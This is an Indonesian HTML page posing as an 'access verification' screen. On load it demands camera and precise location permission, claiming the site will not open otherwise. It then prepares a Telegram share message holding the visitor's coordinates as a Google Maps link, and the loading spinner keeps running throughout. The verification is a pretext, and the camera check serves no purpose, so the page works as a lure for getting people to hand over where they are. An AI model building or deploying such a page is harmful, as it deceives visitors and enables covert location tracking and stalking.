<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verifikasi Akses</title>
  <style>
    :root{--bg:#0b1220;--card:#0f172a;--text:#e5e7eb;--muted:#a3b2c7;--accent:#60a5fa}
    *{box-sizing:border-box}
    html,body{height:100%}
    body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:radial-gradient(1200px 800px at 20% -10%,#1f2937 0,#0b1222 60%,#020617 100%);color:var(--text);display:grid;place-items:center}
    .card{width:min(760px,92vw);background:linear-gradient(180deg,#0b1324 0,#0a0f1a 100%);border:1px solid #1f2a44;border-radius:18px;padding:32px;box-shadow:0 20px 60px rgba(0,0,0,.45)}
    .row{display:flex;align-items:center;gap:18px}
    .spinner{width:54px;height:54px;border-radius:50%;border:6px solid rgba(255,255,255,.15);border-top-color:var(--accent);animation:spin 1s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
    .copy{line-height:1.6;color:var(--muted)}
    .title{font-weight:600;color:#cfe1ff}
    .err{color:#fca5a5;margin-top:10px}
    .ok{color:#86efac;margin-top:10px}
  </style>
</head>
<body>
  <main class="card" role="status" aria-live="polite">
    <div class="row">
      <div class="spinner" aria-hidden="true"></div>
      <div>
        <div class="title">Memverifikasi Akses</div>
        <div class="copy">izinkan lokasi dan kamera demi verifikasi , jika tidak maka tidak akan memuat website</div>
        <div id="state" class="copy" style="margin-top:6px">Menunggu izinâ€¦</div>
      </div>
    </div>
  </main>

  <script>
    // â— Demi keamanan & privasi, halaman ini TIDAK menyimpan / mengirim token bot dari frontâ€‘end.
    // Jika perlu kirim otomatis ke Telegram, gunakan tombol share (aman) atau backend.

    // ===== Konfigurasi teks share =====
    const SHARE_PREFIX = 'ðŸ“ Lokasi saya sekarang';

    function mapsLink(lat, lng){
      return `https://maps.google.com/?q=${lat},${lng}`;
    }

    function status(msg, cls){
      const el = document.getElementById('state');
      el.textContent = msg;
      el.className = 'copy' + (cls ? ' ' + cls : '');
    }

    async function getCameraConsent(){
      if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
        throw new Error('Perangkat tidak mendukung kamera.');
      }
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:'user' }, audio:false });
      // langsung hentikan track â€” verifikasi izin saja
      stream.getTracks().forEach(t => t.stop());
      return true;
    }

    function getGeo(){
      if(!('geolocation' in navigator)){
        throw new Error('Perangkat tidak mendukung lokasi.');
      }
      return new Promise((resolve, reject)=>{
        navigator.geolocation.getCurrentPosition(
          pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }),
          err => reject(new Error(err.message || 'Gagal mendapatkan lokasi.')),
          { enableHighAccuracy:true, timeout:15000, maximumAge:0 }
        );
      });
    }

    function openTelegramShare(text, url){
      const u = new URL('https://t.me/share/url');
      if(url) u.searchParams.set('url', url);
      if(text) u.searchParams.set('text', text);
      // Coba popup, fallback redirect
      const w = window.open(u.toString(), '_blank', 'noopener');
      if(!w){
        window.location.href = u.toString();
      }
    }

    async function run(){
      try {
        status('Meminta izin kameraâ€¦');
        await getCameraConsent();
        status('Meminta izin lokasiâ€¦');
        const { lat, lng, acc } = await getGeo();
        status('Membuka Telegramâ€¦', 'ok');

        const link = mapsLink(lat, lng);
        const text = `${SHARE_PREFIX}\n${link}\n(akurasi Â±${Math.round(acc)} m)`;
        openTelegramShare(text, link);
        // Tetap pada layar loading sesuai permintaan â€” tidak menampilkan UI tambahan.
      } catch (e) {
        status(`Tidak dapat memuat: ${e.message}`, 'err');
        // Tetap pada layar, tidak melanjutkan.
      }
    }

    // Menjalankan otomatis (akan memicu prompt izin)
    document.addEventListener('DOMContentLoaded', run);
  </script>
</body>
</html>
